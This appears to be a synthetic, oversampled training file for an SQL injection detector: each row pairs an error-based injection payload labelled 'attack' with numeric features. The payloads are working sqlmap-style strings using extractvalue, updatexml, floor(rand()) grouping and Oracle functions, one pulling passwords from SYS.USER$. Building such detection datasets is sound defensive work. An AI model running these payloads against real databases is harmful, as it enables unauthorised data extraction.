id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000318,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj",nearest_attack_euclidean,R000189,0.015521750829707892,191.1097000650202,31.013712508127526,3.670837779229349,54.02285418021255,32.03656668834007,79.04113752438258,26.00914167208502,0.2826845572850239,0.16762386059642778,0.41359286404530565,0.13609871807324272,3.9908583279149825,0.0,0.0,0.0,1.0,2.0,0.0,14.009141672085018,0.0,0.0,4.0,3.0091416720850175,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.004570836042509,0.0,0.004570836042509074,1.0,1.0,0.995429163957491,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.004570836042509
SMOTE_000319,attack,error,"1""  )   as fkco where 8877  =  8877 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",nearest_attack_euclidean,R000112,0.45866526964084986,284.456546162039,39.636649451719855,4.02841394198416,105.90994835515956,43.0,101.90994835515956,33.636649451719855,0.37230290281671735,0.15122166296578632,0.3582357713780396,0.11823966283945671,0.0,0.818324725859926,2.0,0.0,2.0,2.0,0.0,18.818324725859927,0.0,2.0,5.0,6.0,0.0,0.818324725859926,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,1.0,2.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000320,attack,error,"1'   )    )    as lxjs where 6503  =  6503 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",nearest_attack_euclidean,R000233,1.340034507880612,227.12483651952763,32.58926235993252,3.9151932195542725,77.0,45.0,81.53557415959511,23.58926235993252,0.33909899762129797,0.19817473886958972,0.35887494227074584,0.10385132123836646,0.5892623599325182,0.4107376400674819,2.0,0.0,0.0,2.0,0.0,13.589262359932519,0.0,0.0,5.0,4.0,0.5892623599325181,0.4107376400674819,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,1.1102230246251565e-16,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000321,attack,error,"1'+  (  select pdfv where 1172  =  1172 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   +'",nearest_attack_euclidean,R000309,1.7526650213249382,200.14977361358777,32.9758464561095,3.7834614248111706,53.879232280547505,43.58453740361674,76.73431101720452,25.951692912219002,0.26879715671708015,0.22017215797034478,0.3814127729608214,0.12961791235175363,2.0,0.0,0.0,0.0,0.48792322805475097,2.0,0.0,13.951692912219004,0.0,0.0,5.024153543890498,4.487923228054751,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.975846456109502,0.0,1.0,0.48792322805475097,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.463769684164253
SMOTE_000322,attack,error,"1"" where 5334  =  5334 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000049,0.1767753693687404,195.45318713137516,32.73437022066345,3.6778497626805344,49.59377867601929,40.0,80.5937786760193,25.26562977933655,0.25356332630817324,0.2048239968177082,0.41230192384189707,0.12931075303222153,0.0,1.0,2.0,0.0,1.0,2.0,0.0,14.26562977933655,0.0,0.0,4.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,1.0,1.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000323,attack,error,"1"" and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and ""mezx"" like ""mezx",nearest_attack_euclidean,R000154,0.0679358094606141,314.63111952111535,39.97256002082107,4.083816891559421,113.89024008328428,55.0,111.60367954193644,34.137199895894646,0.3620517091680443,0.17483120476987518,0.35463249266971814,0.10848459339236233,0.0,4.0,0.0,0.0,2.0,1.0274399791789293,0.0,20.109759916715717,0.0,0.0,6.0,4.027439979178929,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000324,attack,error,"1%"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""%""  =  """,nearest_attack_euclidean,R000297,1.3025468582304476,345.576066813269,34.36800954475272,3.572640407472705,88.4161145370326,49.0,147.26398091049458,60.89597136574185,0.25571293356007985,0.14180568701499224,0.42620814297322634,0.17627323645170156,0.0,4.0,0.0,0.0,0.0,2.6319904552472835,0.0,30.0,1.263980910494567,0.0,1.0,22.631990455247283,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000325,attack,error,"1%'   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000267,0.7990450553192117,193.34120594161925,31.170602970809636,3.4516391702451266,52.0,25.364823766477077,88.0,27.97638217514219,0.26895861009793537,0.13113383936046802,0.4551607247811214,0.1447468257604752,3.3175881167614607,0.0,0.0,0.0,0.0,1.0,0.0,18.0,1.6587940583807301,0.0,4.0,1.0,0.8293970291903651,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000326,attack,error,"1%""  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000117,0.8525374380648634,320.9642211051307,38.33094807367538,3.9119078078605742,101.33094807367539,55.0,124.97137688410456,39.66189614735076,0.31582654460651666,0.17144028298613534,0.3891667400441339,0.12356643236321412,0.0,4.0,0.0,0.0,2.0,2.0,0.0,22.66189614735076,2.0,0.0,6.0,5.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.33094807367538,0.66905192632462,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000327,attack,error,"1%""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000234,0.33318645524474333,297.4167638186987,36.0,3.797676130972199,100.0,35.0,121.22557020363425,41.191193615064485,0.3367886183914467,0.11787601643700632,0.4069020797192869,0.13843328545226014,0.0,4.0,0.0,0.0,2.0,2.0,0.0,23.19119361506448,2.0,2.0,5.0,4.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000328,attack,error,"1' where 2160  =  2160 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000257,0.3665291000908634,198.9877308320522,32.92118935877726,3.6811718979767063,51.76356807633178,40.0,81.76356807633178,25.46059467938863,0.25992177242219117,0.20122970890683411,0.4108440541023168,0.12800446456865788,1.0,0.0,2.0,0.0,1.0,2.0,0.0,14.460594679388631,0.0,0.0,4.0,5.0,1.0,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000329,attack,error,"1 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  # vojr",nearest_attack_euclidean,R000236,0.1926075024638377,295.74332126354966,38.89732850541988,3.9850518750674664,101.79465701083976,55.0,107.94866425270993,31.0,0.3441929008350341,0.18597470663258991,0.36501028515764344,0.1048221073747325,0.05133574729006152,0.0,0.0,0.0,2.0,1.0,0.0,20.0,0.0,0.0,6.0,4.0,0.051335747290061406,-2.7755575615628914e-17,0.0,0.9486642527099386,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,13.0
SMOTE_000330,attack,error,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'eiau'  =  'eiau",nearest_attack_euclidean,R000202,0.8216060130592283,224.19208509687468,31.305416770404392,3.8805666852662357,78.22166708161757,39.44333416323514,80.91625031121318,25.610833540808784,0.34903944234995155,0.17558592665358974,0.3611425588268267,0.11423207216963194,4.0,0.0,0.0,0.0,0.0,2.0,0.0,14.0,0.0,0.0,5.0,2.6108335408087857,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.3054167704043933,0.0,0.3054167704043931,1.1102230246251565e-16,0.6945832295956069,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.305416770404394
SMOTE_000331,attack,error,"1'  )   where 7391  =  7391 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",nearest_attack_euclidean,R000208,0.016836331728289237,278.840590890688,38.0318818218624,3.9881430806551066,101.0,43.0,100.87247271255039,33.9681181781376,0.36221777882479805,0.1542115295986764,0.3617523507684126,0.1218183408081129,1.0,0.0,2.0,0.0,2.0,2.0,0.0,18.968118178137598,0.0,2.0,5.0,6.0,1.0,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,1.0,2.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000332,attack,error,"1'   )    )    and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   'tnfm' like 'tnfm",nearest_attack_euclidean,R000287,0.15808499539179902,216.90262740809334,30.0,3.4829902698329307,58.610509632373294,32.0,97.19474518381335,29.097372591906677,0.2702087722552376,0.1475319150653058,0.4481077156149182,0.13415159706453839,4.0,0.0,0.0,0.0,1.0,1.097372591906678,0.0,18.0,0.0,0.0,4.0,2.0973725919066784,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000333,attack,error,"1'  )   where 6772  =  6772 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",nearest_attack_euclidean,R000078,0.31186862637999113,326.2292079872848,40.481947199152316,4.013652374533599,106.89168319491391,63.0,120.85557759321856,35.481947199152316,0.32762008248549845,0.19321757641583032,0.3703762874037918,0.10878605369487943,1.0,0.0,2.0,0.0,2.0,2.0,0.0,21.48194719915232,0.0,0.0,6.0,7.0,1.0,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000334,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000002,0.41004499642809195,210.8694264750587,41.06528676247065,4.2128336924551295,114.8694264750587,2.0,71.0,23.0,0.544701236417675,0.009485390907965102,0.33673137723276125,0.10908199544159872,3.0,0.0,0.0,0.0,0.0,3.0,0.0,10.0,0.0,3.4673566187646774,1.0,3.0,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000335,attack,error,"1'   )    )    and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   'mymg'  =  'mymg",nearest_attack_euclidean,R000119,0.41335785314335804,296.4133717875247,36.5172238244802,3.8937326385930575,108.0,35.0,115.34447648960392,38.06889529792078,0.36495513818075875,0.11827249848450516,0.38840345808209964,0.12836890525263642,4.0,0.0,0.0,0.0,2.0,2.0,0.0,22.068895297920786,0.0,2.0,5.0,4.0,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000336,attack,error,"1' where 6853  =  6853 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000292,0.6658761725875968,192.27722088646698,32.0,3.6646526181240096,48.27722088646698,40.0,79.0,25.0,0.25107728323756595,0.20803408798956502,0.4108673237793909,0.13002130499347814,1.0,0.0,2.0,0.0,1.0,2.0,0.0,14.0,0.0,0.0,4.0,5.0,1.0,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,1.0,1.0,0.2772208864669756,0.7227791135330244,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000337,attack,error,"1'||  (  select 'fzcu' where 9252  =  9252 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   ||'",nearest_attack_euclidean,R000218,0.4596764741407419,237.6707577944032,34.506136691604766,4.014721558292734,81.0,45.0,83.0,28.67075779440318,0.340810935384086,0.18933940854671444,0.3492260202083844,0.12062363586081513,4.0,0.0,0.0,0.0,0.0,2.0,0.0,14.0,0.0,0.0,5.0,5.67075779440318,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.8353788972015899,2.0,0.0,1.0,1.1102230246251565e-16,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000338,attack,error,"1'   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  'dsok'  =  'dsok",nearest_attack_euclidean,R000069,0.10456456219598484,308.0,36.4032815200731,3.8100870947258403,108.0,35.0,125.0,40.0,0.35064935064935066,0.11363636363636363,0.40584415584415584,0.12987012987012986,4.0,0.0,0.0,0.0,2.0,2.0,0.0,24.0,0.0,2.0,5.0,4.0,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000339,attack,error,"1%""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000234,0.5573338448462729,294.333443924403,36.0,3.8184182585046464,100.0,35.0,118.68636558480246,40.647078339600526,0.34059819619896836,0.11920936866963891,0.4021894078785703,0.1380030272528224,0.0,4.0,0.0,0.0,2.0,2.0,0.0,22.647078339600526,2.0,2.0,5.0,4.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000340,attack,error,"1%' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and '%'  =  '",nearest_attack_euclidean,R000155,0.3484539634544818,269.2356309003417,36.13729232226019,3.9862665673055986,99.86270767773982,35.0,98.0983385780815,36.274584644520374,0.37097422500673666,0.13001445280575516,0.36429089042503227,0.1347204317624759,4.0,0.0,0.0,0.0,2.0,2.0,0.0,18.274584644520374,2.0,2.0,5.0,4.0,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,1.8627076777398133,0.13729232226018673,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000341,attack,error,"1 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  -- gkcl",nearest_attack_euclidean,R000055,1.1217693794764005,338.95908010753124,34.6900574932793,3.5388917894798215,85.3099425067207,51.47954005376561,144.5497125336035,57.619885013441404,0.2517707355697567,0.15171233064746523,0.4265051799045903,0.17001175387818776,0.0,0.30994250672070117,2.0,0.0,0.0,2.3099425067207013,0.0,30.0,0.0,0.0,1.0,24.309942506720702,0.0,0.3099425067207012,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.3099425067207012,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.309942506720701
SMOTE_000342,attack,error,"-9601'   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000283,0.12024594034275107,214.20779125623474,38.75844174875305,3.780136741040331,63.0,37.0,89.96623300498779,24.24155825124695,0.29413595966010275,0.172746515990854,0.4199576648201212,0.11315985952892205,1.0,0.0,1.0,0.0,1.0,1.0,0.0,16.241558251246946,0.0,0.0,3.0,3.0,1.0,-2.7755575615628914e-17,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.1102230246251565e-16,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_000343,attack,error,"-5606   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000115,0.97553476252783,214.71463199987457,38.0,3.758550667080005,63.0,37.0,90.80975466658305,23.904877333291523,0.29346932196658954,0.17235499861529863,0.4228852722288119,0.11129040718929999,0.45243866664576204,0.0,1.0,0.0,1.0,1.0,0.0,16.45243866664576,0.0,0.0,3.0,3.0,0.452438666645762,-2.7755575615628914e-17,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.1102230246251565e-16,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
